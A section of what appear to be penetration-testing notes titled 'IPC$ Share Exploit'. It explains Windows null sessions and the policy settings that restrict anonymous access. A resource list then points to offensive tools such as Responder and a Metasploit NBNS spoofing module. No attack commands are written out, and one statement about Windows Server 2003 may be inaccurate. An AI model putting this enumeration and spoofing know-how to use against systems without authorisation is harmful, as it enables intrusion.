#### IPC$ Share Exploit

*   **Description:** The IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.

    The IPC$ share is created by the Windows Server service. This special share exists to allow for subsequent named pipe connections to the server. The server's named pipes are created by built-in operating system components and by any applications or services that are installed on the system. When the named pipe is being created, the process specifies the security associated with the pipe. Then it makes sure that access is only granted to the specified users or groups.

    Configure anonymous access by using network access policy settings

    The IPC$ share can't be managed or restricted in the following versions of Windows:

    * Windows Server 2003
    * Windows Server 2008
    * Windows Server 2008 R2

    However, an administrator has controls over any named pipes that were enabled. They can be accessed anonymously by using the `Network access: Named Pipes that can be accessed anonymously` security policy setting. If the policy setting is configured to have no entries, such as a Null value, no named pipes can be accessed anonymously. And you must ensure that no applications or services in the environment rely on anonymous access to any named pipes on the server.

    Windows Server 2003 no longer prevents anonymous access to IPC$ share. The following security policy setting defines whether the Everyone group is added to an anonymous session:

    `Network access: Let Everyone permissions apply to anonymous users`

    If this setting is disabled, the only resources that can be accessed by an anonymous user are those resources granted to the Anonymous Logon group.

    In Windows Server 2012 or a later version, there's a feature to determine whether anonymous sessions should be enabled on file servers. It's determined by checking if any pipes or shares are marked for remote access.

## Resources

| **Website**               | **URL**                                                                                         |
| ------------------------- | ----------------------------------------------------------------------------------------------- |
| RFC 1002                  | https://tools.ietf.org/html/rfc1002                                                             |
| Samba Documentation       | https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html                              |
| nbtscan Tool              | http://www.inetcat.net/software/nbtscan.html                                                    |
| Wireshark NBNS Analysis   | https://www.wireshark.org/docs/wsug\_html\_chunked/ChAdvNameResolutionSection.html              |
| Responder GitHub          | https://github.com/SpiderLabs/Responder                                                         |
| Metasploit NBNS Module    | https://www.rapid7.com/db/modules/auxiliary/spoof/nbns/nbns\_response                           |
| Windows Networking Guide  | https://docs.microsoft.com/en-us/windows-server/networking/technologies/network-name-resolution |
| Linux man-pages           | https://man7.org/linux/man-pages/                                                               |
| TCP/IP Illustrated        | https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469                      |
| Network Protocol Handbook | https://www.amazon.com/Network-Protocol-Handbook-Matthew-Gast/dp/0997195105                     |
